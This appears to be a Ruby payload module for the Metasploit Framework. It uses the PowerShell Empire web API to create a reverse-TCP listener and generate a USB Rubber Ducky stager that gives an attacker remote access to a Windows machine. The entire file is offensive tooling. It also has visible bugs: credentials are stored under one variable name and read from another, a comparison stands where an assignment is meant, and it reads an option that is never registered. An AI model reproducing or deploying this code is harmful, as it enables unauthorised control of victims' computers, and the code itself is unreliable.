# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see theMetasploit
# web site for more information on licensing and terms of use.
# http://metasploit.com
require 'socket'
require 'resolv-replace'
require 'msf/core/handler/empire_reverse_tcp.rb'
require 'msf/core/module/data_store'
require 'msf/core/module/options'
require 'msf/core/empire_lib.rb'

module MetasploitModule

  CachedSize = 387

  include Msf::Empire
  include Msf::Module::Options
  include Msf::Module::DataStore
  include Msf::Payload::Stager
  def initialize(info={})
    super(merge_info(info,
    'Name'       => 'Empire Stager Module',
    'Description'=> 'Creates Ducky script that runs One-liner stage0 launcher for Empire.',
    'Author'     => ['author_name'],
    'License'    => MSF_LICENSE,
    'Platform'   => ['Windows', 'Linux', 'MacOS'],
    'Arch'       => ARCH_CMD,
    'Handler'    => Msf::Handler::EmpireReverseTcp
    ))
    register_options(
      [

      OptString.new(
        'USERNAME',
        [true,
        'Username for Empire Web-API'
        ]),
      OptString.new(
        'PASSWORD',
        [true,
        'Password for Empire Web-API'
        ]),
      OptAddress.new(
        'LHOST',
        [false,
        'The local address to lisen on, or the framework will try self-detection'
        ]),
      OptPort.new(
        'LPORT',
        [true,
        'The local port to listen on'
        ]),
      OptString.new(
        'ListenerName',
        [false,
         'The empire listener name that would listen for the created stager on the local system, ignore for random generation.',
        ])
    ])
  end

  def generate
    #
    #Storing data from user
    #
    @empire_username = datastore['USERNAME'].to_s
    @empire_password = datastore['PASSWORD'].to_s
    if @username.empty?
      return ""
    end
    if @password.empty?
      return ""
    end
    @host = datastore['LHOST'].to_s
    @port = datastore['LPORT'].to_s
    @listener_name = datastore['ListenerName'].to_s
    @stager_type = datastore['StagerType'].to_s
    #Validating Variables
    #LHOST
    if datastore['LHOST']
      @host = datastore['LHOST']
    else
      ip = Socket.ip_address_list.detect{|intf| intf.ipv4_private?}
      @host = ip.ip_address
    end

    #ListenerName
    if datastore['ListenerName']
      @listener_name = datastore['ListenerName']
    else
      @listener_name = "ListenerEmpire#{rand(1..100)}"
    end
    #
    #Creating an empire object
    #
    client_emp = Msf::Empire::Client.new(@username,@password)
    #
    #Check if any listener with provided listener name exists previously
    #
    response = client_emp.is_listener_active(@listener_name)
    if response == false
      if client_emp.is_port_active(@port) == false
        responseListener = client_emp.create_listener(@listener_name, @port, @host)
      else
        @listener_name == client_emp.is_port_active(@port).to_s
      end
    end
    #
    #Generating payload
    #
    @stagerCode = client_emp.gen_stager(@listener_name, 'windows/ducky')
    return @stagerCode
  end
end

